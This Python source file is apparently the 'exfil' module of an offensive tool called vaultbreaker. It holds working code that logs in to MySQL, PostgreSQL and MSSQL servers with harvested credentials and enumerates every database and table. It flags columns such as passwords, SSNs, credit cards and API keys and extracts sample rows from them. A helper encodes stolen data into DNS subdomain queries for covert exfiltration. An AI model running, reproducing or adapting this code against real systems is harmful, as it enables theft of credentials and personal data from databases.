"""Data exfiltration -- enumeration, sensitive column detection, selective extraction, DNS exfil."""
from __future__ import annotations

import base64
import csv
import json
from typing import Dict, List, Optional

from vaultbreaker.models import AttackResult, Credential, EngagementContext
from vaultbreaker.logger import info, ok, warn, crit, section, console
from vaultbreaker.modules.base import BaseModule


class ExfilModule(BaseModule):
    """Data exfiltration -- enumeration, sensitive column detection, selective extraction, DNS exfil."""

    name = "exfil"

    SENSITIVE_COLUMN_KEYWORDS = [
        "password", "passwd", "pwd", "credit_card", "creditcard", "cc_number",
        "ssn", "social_security", "email", "phone", "address", "token",
        "secret", "api_key", "apikey", "private", "private_key", "salt",
        "hash", "session", "cookie", "auth", "credential", "bank",
    ]

    def run(self, ctx: EngagementContext) -> None:
        section("Exfiltration Module")
        for cred in ctx.credentials:
            info(
                f"Using credential: {cred.username}@{cred.host}:{cred.port} ({cred.source})"
            )
            if "mysql" in cred.source:
                self._exfil_mysql(ctx, cred)
            elif "postgres" in cred.source:
                self._exfil_postgres(ctx, cred)
            elif "mssql" in cred.source:
                self._exfil_mssql(ctx, cred)
        if not ctx.credentials:
            ctx.add_result(AttackResult("exfil", "Exfiltration", "fail", "info",
                                        "No credentials available — run cred module first"))

    def _exfil_mysql(self, ctx: EngagementContext, cred: Credential):
        try:
            import mysql.connector
            conn = mysql.connector.connect(
                host=cred.host, port=cred.port,
                user=cred.username, password=cred.password,
                connection_timeout=ctx.timeout
            )
            cursor = conn.cursor()
            cursor.execute("SHOW DATABASES")
            databases = [row[0] for row in cursor.fetchall()]
            ctx.add_result(AttackResult(
                "exfil", "MySQL Database Enumeration", "ok", "high",
                f"Found {len(databases)} databases: {', '.join(databases[:15])}"
            ))
            for db_name in databases:
                if db_name in ("information_schema", "performance_schema", "sys"):
                    continue
                try:
                    cursor.execute(f"USE `{db_name}`")
                    cursor.execute("SHOW TABLES")
                    tables = [row[0] for row in cursor.fetchall()]
                    for table in tables:
                        cursor.execute(f"SHOW COLUMNS FROM `{table}`")
                        columns = [row[0] for row in cursor.fetchall()]
                        sensitive = [c for c in columns
                                     if any(kw in c.lower() for kw in self.SENSITIVE_COLUMN_KEYWORDS)]
                        if sensitive:
                            cursor.execute(f"SELECT COUNT(*) FROM `{table}`")
                            row_count = cursor.fetchone()[0]
                            ctx.add_result(AttackResult(
                                "exfil", "Sensitive Data Detected", "critical", "critical",
                                f"{db_name}.{table}: {row_count} rows, "
                                f"sensitive columns: {', '.join(sensitive)}"
                            ))
                            if sensitive and row_count > 0:
                                cols_str = ", ".join(f"`{c}`" for c in sensitive[:5])
                                cursor.execute(f"SELECT {cols_str} FROM `{table}` LIMIT 5")
                                sample_rows = cursor.fetchall()
                                for i, row in enumerate(sample_rows):
                                    preview = {sensitive[j]: str(v)[:50] for j, v in enumerate(row)
                                               if j < len(sensitive)}
                                    ctx.add_result(AttackResult(
                                        "exfil", "Data Sample", "ok", "critical",
                                        f"{db_name}.{table} row {i+1}: {json.dumps(preview)}"
                                    ))
                except Exception:
                    pass
            cursor.close()
            conn.close()
        except ImportError:
            ctx.add_result(AttackResult("exfil", "MySQL Exfiltration", "fail", "info",
                                        "mysql-connector-python not installed"))
        except Exception as e:
            ctx.add_result(AttackResult("exfil", "MySQL Exfiltration", "fail", "low",
                                        f"Error: {e}"))

    def _exfil_postgres(self, ctx: EngagementContext, cred: Credential):
        try:
            import psycopg2
            conn = psycopg2.connect(
                host=cred.host, port=cred.port,
                user=cred.username, password=cred.password,
                dbname="postgres", connect_timeout=ctx.timeout
            )
            cursor = conn.cursor()
            cursor.execute(
                "SELECT datname FROM pg_database WHERE datistemplate = false"
            )
            databases = [row[0] for row in cursor.fetchall()]
            ctx.add_result(AttackResult(
                "exfil", "PostgreSQL Database Enumeration", "ok", "high",
                f"Found {len(databases)} databases: {', '.join(databases[:15])}"
            ))
            cursor.close()
            conn.close()
            for db_name in databases:
                try:
                    conn = psycopg2.connect(
                        host=cred.host, port=cred.port,
                        user=cred.username, password=cred.password,
                        dbname=db_name, connect_timeout=ctx.timeout
                    )
                    cursor = conn.cursor()
                    cursor.execute(
                        "SELECT table_schema, table_name FROM information_schema.tables "
                        "WHERE table_schema NOT IN ('pg_catalog', 'information_schema')"
                    )
                    tables = cursor.fetchall()
                    for schema, table in tables:
                        cursor.execute(
                            "SELECT column_name FROM information_schema.columns "
                            f"WHERE table_schema = '{schema}' AND table_name = '{table}'"
                        )
                        columns = [row[0] for row in cursor.fetchall()]
                        sensitive = [c for c in columns
                                     if any(kw in c.lower() for kw in self.SENSITIVE_COLUMN_KEYWORDS)]
                        if sensitive:
                            cursor.execute(f'SELECT COUNT(*) FROM "{schema}"."{table}"')
                            row_count = cursor.fetchone()[0]
                            ctx.add_result(AttackResult(
                                "exfil", "Sensitive Data Detected", "critical", "critical",
                                f"{db_name}.{schema}.{table}: {row_count} rows, "
                                f"sensitive columns: {', '.join(sensitive)}"
                            ))
                            if row_count > 0:
                                cols_str = ", ".join(f'"{c}"' for c in sensitive[:5])
                                cursor.execute(
                                    f'SELECT {cols_str} FROM "{schema}"."{table}" LIMIT 5'
                                )
                                sample_rows = cursor.fetchall()
                                for i, row in enumerate(sample_rows):
                                    preview = {sensitive[j]: str(v)[:50] for j, v in enumerate(row)
                                               if j < len(sensitive)}
                                    ctx.add_result(AttackResult(
                                        "exfil", "Data Sample", "ok", "critical",
                                        f"{db_name}.{schema}.{table} row {i+1}: {json.dumps(preview)}"
                                    ))
                    cursor.close()
                    conn.close()
                except Exception:
                    pass
        except ImportError:
            ctx.add_result(AttackResult("exfil", "PostgreSQL Exfiltration", "fail", "info",
                                        "psycopg2 not installed"))
        except Exception as e:
            ctx.add_result(AttackResult("exfil", "PostgreSQL Exfiltration", "fail", "low",
                                        f"Error: {e}"))

    def _exfil_mssql(self, ctx: EngagementContext, cred: Credential):
        try:
            import pymssql
            conn = pymssql.connect(
                server=cred.host, port=str(cred.port),
                user=cred.username, password=cred.password,
                login_timeout=ctx.timeout
            )
            cursor = conn.cursor()
            cursor.execute("SELECT name FROM sys.databases")
            databases = [row[0] for row in cursor.fetchall()]
            ctx.add_result(AttackResult(
                "exfil", "MSSQL Database Enumeration", "ok", "high",
                f"Found {len(databases)} databases: {', '.join(databases[:15])}"
            ))
            for db_name in databases:
                if db_name in ("master", "tempdb", "model", "msdb"):
                    continue
                try:
                    cursor.execute(f"USE [{db_name}]")
                    cursor.execute(
                        "SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES "
                        "WHERE TABLE_TYPE = 'BASE TABLE'"
                    )
                    tables = cursor.fetchall()
                    for schema, table in tables:
                        cursor.execute(
                            "SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS "
                            f"WHERE TABLE_SCHEMA = '{schema}' AND TABLE_NAME = '{table}'"
                        )
                        columns = [row[0] for row in cursor.fetchall()]
                        sensitive = [c for c in columns
                                     if any(kw in c.lower() for kw in self.SENSITIVE_COLUMN_KEYWORDS)]
                        if sensitive:
                            cursor.execute(f"SELECT COUNT(*) FROM [{schema}].[{table}]")
                            row_count = cursor.fetchone()[0]
                            ctx.add_result(AttackResult(
                                "exfil", "Sensitive Data Detected", "critical", "critical",
                                f"{db_name}.{schema}.{table}: {row_count} rows, "
                                f"sensitive columns: {', '.join(sensitive)}"
                            ))
                            if row_count > 0:
                                cols_str = ", ".join(f"[{c}]" for c in sensitive[:5])
                                cursor.execute(
                                    f"SELECT TOP 5 {cols_str} FROM [{schema}].[{table}]"
                                )
                                sample_rows = cursor.fetchall()
                                for i, row in enumerate(sample_rows):
                                    preview = {sensitive[j]: str(v)[:50] for j, v in enumerate(row)
                                               if j < len(sensitive)}
                                    ctx.add_result(AttackResult(
                                        "exfil", "Data Sample", "ok", "critical",
                                        f"{db_name}.{schema}.{table} row {i+1}: {json.dumps(preview)}"
                                    ))
                except Exception:
                    pass
            cursor.close()
            conn.close()
        except ImportError:
            ctx.add_result(AttackResult("exfil", "MSSQL Exfiltration", "fail", "info",
                                        "pymssql not installed"))
        except Exception as e:
            ctx.add_result(AttackResult("exfil", "MSSQL Exfiltration", "fail", "low",
                                        f"Error: {e}"))

    @staticmethod
    def dns_exfil_encode(data: str, domain: str, chunk_size: int = 30) -> List[str]:
        """Encode data as DNS subdomain queries (base32 chunks)."""
        encoded = base64.b32encode(data.encode()).decode().rstrip("=").lower()
        queries = []
        for i in range(0, len(encoded), chunk_size):
            chunk = encoded[i:i + chunk_size]
            queries.append(f"{chunk}.{i // chunk_size}.{domain}")
        return queries

    @staticmethod
    def export_csv(data: List[Dict], filepath: str):
        """Export extracted data to CSV."""
        if not data:
            return
        fieldnames = list(data[0].keys())
        with open(filepath, "w", newline="") as f:
            writer = csv.DictWriter(f, fieldnames=fieldnames)
            writer.writeheader()
            writer.writerows(data)
